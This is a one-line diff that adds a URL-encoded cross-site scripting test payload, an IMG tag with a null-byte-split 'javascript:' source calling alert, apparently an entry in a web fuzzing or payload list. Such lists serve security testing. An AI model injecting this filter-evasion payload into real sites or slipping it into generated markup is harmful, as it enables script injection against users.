@@ -1,0 +1,1 @@
+%3CIMG%20SRC%3Djava%00script%3Aalert%28%5C%22XSS%5C%22%29%3E
